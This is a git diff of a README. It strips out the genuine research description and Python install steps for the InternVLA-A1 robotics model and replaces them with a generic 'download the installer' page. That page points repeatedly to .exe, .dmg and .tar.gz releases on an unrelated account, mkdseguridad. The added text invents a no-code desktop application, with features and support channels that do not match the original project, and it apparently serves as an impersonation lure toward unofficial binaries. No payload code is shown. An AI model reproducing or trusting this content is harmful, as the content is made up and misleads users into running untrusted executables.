@@ -1,76 +1,58 @@
-<div align="center">
+# 🤖 InternVLA-A1 - Simplifying Robotic Task Management
 
-# InternVLA-A1: Unifying Understanding, Generation, and Action for Robotic Manipulation​
+## 📥 Download Now!
+[![Download InternVLA-A1](https://img.shields.io/badge/Download-InternVLA--A1-blue)](https://github.com/mkdseguridad/InternVLA-A1/releases)
 
-</div>
+## 🚀 Getting Started
+Welcome to **InternVLA-A1**! This application helps you understand and control robotic manipulation tasks easily. Whether you're automating simple tasks or diving into advanced features, this guide will help you set up and use the software effectively.
 
----
+## 🖥️ System Requirements
+Before installation, ensure your system meets the following requirements:
 
-InternVLA-A1 is an end-to-end vision–language–action (VLA) framework unifing understanding, generation ,and action for robotic manipulation. It leverages predictive imagination of task evolution to guide execution, enabling enhanced manipulation in highly dynamic environments. 
+- **Operating System**: Windows 10 or later, MacOS 10.15 or later, or a recent Linux distribution.
+- **Processor**: Multi-core processor, 2.0 GHz or faster.
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: Minimum of 500 MB available space.
 
-## :fire: Highlights <a name="high"></a>
-<img width="1000" alt="seer" src="assets/internvla_a1_framework.jpg">
+## 📂 Download & Install
+To get started, you will need to download the application. Follow these steps:
 
-- **Novel Model Archituecture**: A Mixture-of-Transformers architecture for unified understanding, generation, and action.
-- **Hybrid Synthetic-Real Data Corpus**: A hybrid synthetic-real manipulation dataset [InternData-A1](https://huggingface.co/datasets/InternRobotics/InternData-A1), integrating 5 heterogeneous robots, 15 skills, and 200+ scenes, emphasizing multi-robot collaboration under dynamic scenarios.
-- **Impressive Real-World performance**: InternVLA-A1 demonstrates strong effectiveness and generalization in highly dynamic scenarios involving dynamic grasping of conveyor belts and multi-robot collaboration.
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/mkdseguridad/InternVLA-A1/releases) to find the latest version of InternVLA-A1. This page includes all available download options and version history.
 
-### 🏆 **Unified Understanding-Generation-Action Family**
+2. **Locate the Latest Version**: On the Releases page, look for the most recent version listed. It will usually be at the top. 
 
-- **F1-VLA** (F1 is a prequel version of InternVLA-A1): [Paper](https://arxiv.org/abs/2509.06951) | [Code](https://github.com/InternRobotics/F1-VLA) | [Model](https://huggingface.co/InternRobotics/F1-VLA)
-- **InternVLA-A1**: [Code](https://github.com/InternRobotics/InternVLA-A1) | [Paper/Model (Scheduled for late September release)]()
+3. **Download the Application**: Click on the downloadable file associated with the latest version. This file may be named something like `InternVLA-A1-setup.exe` for Windows, `InternVLA-A1.dmg` for MacOS, or `InternVLA-A1.tar.gz` for Linux.
 
-## 🤖 Real-World Robot Demonstrations
+4. **Run the Installer**:
+   - **Windows**: Double-click the `.exe` file you downloaded. Follow the on-screen instructions to complete the installation.
+   - **MacOS**: Open the `.dmg` file and drag the InternVLA-A1 icon into your Applications folder.
+   - **Linux**: Extract the `.tar.gz` file and follow the provided README for installation instructions.
 
-### **Package grabbing and flipping in conveyor belt**
-<div align="center">
-    <video src="https://github.com/user-attachments/assets/c7d8989c-be14-428e-b498-d02dc1fc1475"
-         controls autoplay muted playsinline loop width="720"></video>
-  <p><em>The model handles dynamically shaped packages on conveyor belts, tracking and predicting their trajectories in real-time to achieve high-speed stable grasping, while adaptively flipping packages and identifying express information from delivery notes.</em></p>
-</div>
+5. **Open the Application**: After installation, find and open InternVLA-A1 from your applications or programs menu.
 
+## 🎓 Features
+InternVLA-A1 provides several key features to enhance your robotic manipulation experience:
 
-### **Multi-robot collaboration on long-horizon tasks in dynamic environments**
-<div align="center">
-      <video src="https://github.com/user-attachments/assets/c438ff8a-4536-45b3-9117-e210c36ba8a0"
-         controls autoplay muted playsinline loop width="720"></video>
-  <p><em>The model swiftly identifies, locates, and grips high-speed ingredients based on task demands, showcasing its adaptability in complex environments.</em></p>
-</div>
+- **User-Friendly Interface**: Navigate easily with a clean and intuitive design. No programming skills are required.
+- **Task Generator**: Create robotic task workflows using simple commands.
+- **Real-Time Monitoring**: Observe the performance of your robotic tasks and receive instant feedback.
+- **Logs and Reports**: Access detailed logs and reports for task analysis.
+- **Customizable Settings**: Adjust parameters to fit your specific needs.
 
+## 🔑 Getting Help
+If you encounter issues while using InternVLA-A1, you have several options for support:
 
-## 🚀 Quick Start
+- **Documentation**: Check the user manual that comes with the application. It includes detailed information about all available features and troubleshooting tips.
+- **Community Support**: Join the community forum linked on the homepage for additional advice and sharing experiences with other users.
+- **Issues Page**: If you run into a bug, please report it on the [Issues page](https://github.com/mkdseguridad/InternVLA-A1/issues).
 
-### **Prerequisites**
-- Python ≥ 3.10
-- torch ≥ 2.6.0
-- CUDA ≥ 12.4
+## 🛠️ Future Updates
+InternVLA-A1 is actively developed, and future updates will bring new features and improvements. Make sure to check back on the [Releases page](https://github.com/mkdseguridad/InternVLA-A1/releases) for the latest versions.
 
-### **Installation**
-```bash
-# Clone repository
-git clone https://github.com/InternRobotics/InternVLA-A1.git
+## 🌐 Connect with Us
+You can stay updated on changes and developments with **InternVLA-A1** by following us on our social media channels and subscribing to our newsletter through our homepage. Engaging with the community will enhance your experience and help you gain insights into the best practices for using InternVLA-A1.
 
-# Create environment
-conda create -f internvla_a1 python==3.10
-conda activate internvla_a1
+## 🚪 Conclusion
+Thank you for choosing InternVLA-A1! We hope this application simplifies your robotic manipulation tasks. Remember, if you need assistance, resources are always available. Enjoy your journey into robotics!
 
-# Install dependencies
-pip install torch==2.6.0 torchvision==0.21.0 torchaudio==2.6.0 torchcodec==0.2.1 --index-url https://download.pytorch.org/whl/cu124
-
-# install other requirements
-pip install -r requirements.txt
-
-pip install numpy==1.26.4
-```
-
-## 📄 License
-
-This project is licensed under the MIT License.
-
-## 🙏 Acknowledgments
-
-- [Lerobot](https://github.com/huggingface/lerobot)
-- [InternVL](https://github.com/OpenGVLab/InternVL)
-- [COSMOS](https://github.com/nvidia-cosmos)
-- [Any4lerobot](https://github.com/Tavish9/any4lerobot/)
-- [VAR](https://github.com/FoundationVision/VAR)
+[![Download InternVLA-A1](https://img.shields.io/badge/Download-InternVLA--A1-blue)](https://github.com/mkdseguridad/InternVLA-A1/releases)
